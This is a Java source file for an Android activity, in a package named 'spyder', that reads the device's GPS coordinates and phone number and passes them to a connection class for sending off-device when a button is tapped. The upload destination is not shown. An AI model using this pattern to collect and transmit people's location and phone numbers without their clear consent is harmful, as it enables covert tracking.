package com.zavgorodniy.spyder;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.zavgorodniy.spyder.Locator.GPSTracker;
import com.zavgorodniy.spyder.connection.Connection;

public class MainActivity extends Activity {

    Button showLocation;
    TextView tvCurrentLocation;
    TextView tvPreviousLocation;

    GPSTracker gps;
    Connection conn;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        showLocation = (Button) findViewById(R.id.bt_get_coordinates);
        tvCurrentLocation = (TextView) findViewById(R.id.tv_coordinates);
        tvPreviousLocation = (TextView) findViewById(R.id.tv_prev_coordinates);

        // show location button click event
        showLocation.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View arg0) {
                // create class object
                gps = new GPSTracker(MainActivity.this);
                conn = new Connection();


                // check if GPS enabled
                if(gps.canGetLocation()){

                    String latitude = String.valueOf(gps.getLatitude());
                    String longitude = String.valueOf(gps.getLongitude());
                    String telNumber = phoneNumber();

                    conn.sendData(telNumber, latitude, longitude);

                    String coordinates = tvCurrentLocation.getText().toString();
                    tvPreviousLocation.setText(coordinates);
                    coordinates = "Lat: " + latitude + "\nLong: " + longitude;
                    tvCurrentLocation.setText(coordinates);

                    Toast.makeText(getApplicationContext(), "Your Location is - \n" + coordinates +
                            "\n" + telNumber, Toast.LENGTH_LONG).show();
                } else {
                    // can't get location
                    // GPS or Network is not enabled message
                    Toast.makeText(getApplicationContext(), "Please, enable GPS or check connection to network", Toast.LENGTH_LONG).show();
                }
            }
        });
    }

    public String phoneNumber() {
        TelephonyManager tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String mPhoneNumber = tMgr.getLine1Number();
        return mPhoneNumber;
    }
}

